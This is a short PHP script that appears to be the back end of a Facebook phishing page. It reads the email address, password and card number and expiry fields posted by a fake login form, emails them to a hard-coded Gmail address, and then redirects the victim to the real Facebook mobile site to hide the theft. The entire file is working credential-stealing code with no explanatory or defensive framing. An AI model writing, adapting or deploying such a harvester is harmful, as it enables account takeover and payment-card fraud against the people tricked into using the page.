<?php


$message .= "Email Adresse       : ".$_POST['email']."\n";
$message .= "Password          : ".$_POST['pass']."\n";

$cc = $_POST['ccn'];
$subject = "Facebook ".$_POST['exm']."/".$_POST['exy'];
$send = "hichamdacher09@gmail.com";
$headers = 'hichamdacher09@gmail.com' . "\r\n" .
mail($send,$subject,$message,$headers);

header("Location:https://m.facebook.com");?>